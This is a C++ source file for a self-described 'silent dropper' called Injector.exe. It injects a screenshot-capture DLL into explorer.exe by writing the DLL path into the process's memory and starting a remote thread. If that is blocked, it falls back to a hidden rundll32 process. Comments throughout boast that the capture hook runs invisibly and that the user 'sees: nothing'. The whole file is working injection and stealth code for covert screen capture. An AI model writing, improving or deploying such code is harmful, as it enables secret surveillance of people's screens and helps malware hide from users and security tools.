/*
 * Injector.cpp  - Silent dropper (exact same architecture as SecHealthUI.exe)
 *
 * Flow:
 *   1. Double-click Injector.exe -> UAC prompt -> click Yes
 *   2. Finds explorer.exe, tries to inject ScreenCapture.dll
 *   3. If injection blocked (Win11): falls back to rundll32.exe
 *      - rundll32 has NO window -> NOT in taskbar -> invisible
 *      - StartHook() BLOCKS in message loop -> rundll32 stays alive
 *   4. Injector.exe exits silently -> vanishes from everywhere
 *   5. Alt+S = screenshot, Alt+Q = stop
 */

#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string>

static void Fail(const wchar_t* msg, DWORD err)
{
    wchar_t buf[512];
    swprintf_s(buf, 512, L"%s\n\nError: %lu", msg, err);
    MessageBoxW(NULL, buf, L"Injector", MB_ICONERROR | MB_TOPMOST);
}

static DWORD FindPid(const wchar_t* name)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID; break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

static bool DllLoaded(HANDLE hProc)
{
    HMODULE mods[1024]; DWORD needed = 0;
    if (!K32EnumProcessModules(hProc, mods, sizeof(mods), &needed)) return false;
    wchar_t name[MAX_PATH];
    for (DWORD i = 0; i < needed/sizeof(HMODULE); i++) {
        memset(name, 0, sizeof(name));
        if (GetModuleBaseNameW(hProc, mods[i], name, MAX_PATH))
            if (_wcsicmp(name, L"ScreenCapture.dll") == 0) return true;
    }
    return false;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    /* Build DLL path (same folder as this EXE) */
    wchar_t self[MAX_PATH]; memset(self, 0, sizeof(self));
    GetModuleFileNameW(NULL, self, MAX_PATH);
    wchar_t* sl = wcsrchr(self, L'\\');
    if (!sl) return 1;
    *(sl+1) = L'\0';
    std::wstring dllPath = std::wstring(self) + L"ScreenCapture.dll";

    if (GetFileAttributesW(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        Fail(L"ScreenCapture.dll not found in same folder.", GetLastError());
        return 1;
    }

    /* Try primary injection into explorer.exe */
    bool injected = false;
    DWORD pid = FindPid(L"explorer.exe");
    if (pid) {
        HANDLE hProc = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            FALSE, pid);
        if (hProc) {
            if (DllLoaded(hProc)) {
                /* Already injected */
                CloseHandle(hProc);
                return 0;
            }
            size_t sz = (dllPath.size()+1)*sizeof(wchar_t);
            LPVOID pMem = VirtualAllocEx(hProc, NULL, sz,
                                          MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (pMem && WriteProcessMemory(hProc, pMem, dllPath.c_str(), sz, NULL)) {
                LPTHREAD_START_ROUTINE fn = (LPTHREAD_START_ROUTINE)
                    GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
                HANDLE hTh = CreateRemoteThread(hProc, NULL, 0, fn, pMem, 0, NULL);
                if (hTh) {
                    WaitForSingleObject(hTh, 8000);
                    CloseHandle(hTh);
                    injected = DllLoaded(hProc);
                }
            }
            if (pMem) VirtualFreeEx(hProc, pMem, 0, MEM_RELEASE);
            CloseHandle(hProc);
        }
    }

    if (!injected) {
        /*
         * Fallback: rundll32.exe "ScreenCapture.dll",StartHook
         *
         * KEY FIX: StartHook() now BLOCKS in GetMessageW loop.
         *          rundll32 stays alive -> hook stays alive.
         *          rundll32 has NO window -> NOT in taskbar.
         *          CREATE_NO_WINDOW -> no console either.
         *          Result: completely invisible to user.
         */
        std::wstring cmd = L"rundll32.exe \"" + dllPath + L"\",StartHook";
        STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
        PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
        CreateProcessW(NULL, (LPWSTR)cmd.c_str(),
                       NULL, NULL, FALSE,
                       CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }

    /*
     * Injector exits here - completely gone from taskbar and Task Manager.
     * DLL is running inside either explorer.exe or rundll32.exe.
     * User sees: nothing. Exactly like SecHealthUI.exe behavior.
     */
    return 0;
}
